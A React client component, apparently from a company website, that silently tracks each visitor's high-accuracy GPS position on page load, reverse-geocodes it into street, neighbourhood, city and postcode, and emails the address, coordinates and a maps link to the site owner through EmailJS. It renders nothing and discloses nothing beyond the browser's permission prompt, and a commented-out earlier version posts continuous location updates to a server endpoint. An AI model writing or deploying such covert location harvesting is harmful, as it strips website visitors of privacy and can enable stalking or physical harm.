'use client';

import { useEffect } from 'react';
import { sendEmail } from '@/lib/emailjs';

export default function LiveLocationTracker() {
  useEffect(() => {
    // 1. Check if browser supports Geolocation
    if (!('geolocation' in navigator)) {
      console.warn('Geolocation is not supported by this browser.');
      return;
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    };

    // Watch position continuously while the visitor is on the site
    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const pageUrl = window.location.href;
        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

        // Send email ONLY ONCE per session to prevent inbox spam
        const hasSentEmail = sessionStorage.getItem('location_email_sent');

        if (!hasSentEmail) {
          sessionStorage.setItem('location_email_sent', 'true');

          let formattedAddress = 'Address lookup unavailable';
          let localityDetails = {};

          // 2. Perform Reverse Geocoding to get Colony, Road, City, etc.
          try {
            const geoRes = await fetch(
              `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`
            );
            if (geoRes.ok) {
              const geoData = await geoRes.json();
              formattedAddress = geoData.display_name || formattedAddress;
              localityDetails = geoData.address || {};
            }
          } catch (geoErr) {
            console.warn('Reverse geocoding error:', geoErr);
          }

          // Extract specific address fields (Colony, Sector, Suburb, Road)
          const colony =
            localityDetails.suburb ||
            localityDetails.neighbourhood ||
            localityDetails.residential ||
            localityDetails.subdivision ||
            'N/A';
          const road = localityDetails.road || 'N/A';
          const city =
            localityDetails.city ||
            localityDetails.town ||
            localityDetails.village ||
            'N/A';
          const state = localityDetails.state || 'N/A';
          const postcode = localityDetails.postcode || 'N/A';

          const templateParams = {
            name: 'Website Visitor',
            email: 'visitor@thinksync.solutions',
            subject: `📍 Visitor Detected near ${colony !== 'N/A' ? colony : city}`,
            message: `
              A new live GPS location update was captured:
              
              📍 LOCATION DETAILS:
              • Colony / Area: ${colony}
              • Road / Street: ${road}
              • City / Town: ${city}
              • State: ${state}
              • Pincode: ${postcode}
              
              🏠 Full Address:
              ${formattedAddress}
              
              🌐 GPS DATA:
              • Latitude: ${latitude}
              • Longitude: ${longitude}
              • Accuracy: ~${Math.round(accuracy)} meters
              • Page URL: ${pageUrl}
              • Timestamp: ${new Date().toLocaleString()}
              
              🗺 Google Maps Link: ${mapsUrl}
            `,
          };

          try {
            await sendEmail({
              name: templateParams.name,
              email: templateParams.email,
              subject: templateParams.subject,
              message: templateParams.message,
            });

            console.log('Visitor location & address email sent successfully!');
          } catch (err) {
            console.error('Failed to send location email via EmailJS:', err);
            // Reset flag if sending failed so it retries on next coordinate update
            sessionStorage.removeItem('location_email_sent');
          }
        }
      },
      (error) => {
        console.warn('Geolocation error or permission denied:', error.message);
      },
      options
    );

    // Clean up when visitor leaves or navigates away
    return () => navigator.geolocation.clearWatch(watchId);
  }, []);

  return null; // Silent component
}

// 'use client';

// import { useEffect } from 'react';

// export default function LiveLocationTracker() {
//   useEffect(() => {
//     // Check if browser supports Geolocation
//     if (!('geolocation' in navigator)) {
//       console.warn('Geolocation is not supported by this browser.');
//       return;
//     }

//     const options = {
//       enableHighAccuracy: true,
//       timeout: 10000,
//       maximumAge: 0,
//     };

//     // Watch position continuously while the visitor is on thinksync.in
//     const watchId = navigator.geolocation.watchPosition(
//       async (position) => {
//         const payload = {
//           latitude: position.coords.latitude,
//           longitude: position.coords.longitude,
//           accuracy: position.coords.accuracy,
//           timestamp: new Date().toISOString(),
//           pageUrl: window.location.href,
//         };


//         try {
//           await fetch('/api/live-location', {
//             method: 'POST',
//             headers: { 'Content-Type': 'application/json' },
//             body: JSON.stringify(payload),
//           });
//         } catch (err) {
//           console.error('Failed to update visitor location:', err);
//         }
//       },
//       (error) => {
//         console.warn('Geolocation error or permission denied:', error.message);
//       },
//       options
//     );

//     // Clean up when visitor leaves or navigates away
//     return () => navigator.geolocation.clearWatch(watchId);
//   }, []);

//   return null; // Silent component — doesn't render any UI elements
// }